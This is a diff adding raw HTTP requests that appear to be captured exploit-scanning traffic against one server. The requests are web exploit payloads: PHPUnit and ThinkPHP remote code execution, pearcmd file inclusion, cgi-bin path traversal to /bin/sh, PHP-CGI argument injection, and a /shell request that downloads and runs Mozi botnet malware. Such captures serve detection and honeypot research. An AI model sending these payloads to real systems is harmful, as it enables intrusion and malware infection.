@@ -1,0 +1,80 @@
+
+GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+Content-Type: text/plain\r\n
+Content-Length: 33\r\n
+\r\n
+
+GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+\r\n
+
+GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+\r\n
+
+GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+\r\n
+
+GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+\r\n
+
+GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\r\n
+User-Agent: Hello, world\r\n
+Host: 209.74.66.158:80\r\n
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
+Connection: keep-alive\r\n
+\r\n
+
+GET /cgi-bin/luci/;stok=/locale HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+User-Agent: Hello\r\n
+\r\n
+
+POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+Content-Type: text/plain\r\n
+Content-Length: 105\r\n
+\r\n
+
+POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D""+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 98\r\n
+\r\n
+
+POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\r\n
+Host: 209.74.66.158:80\r\n
+Accept: */*\r\n
+Upgrade-Insecure-Requests: 1\r\n
+User-Agent: Custom-AsyncHttpClient\r\n
+Connection: keep-alive\r\n
+Content-Type: text/plain\r\n
+Content-Length: 105\r\n
+\r\n
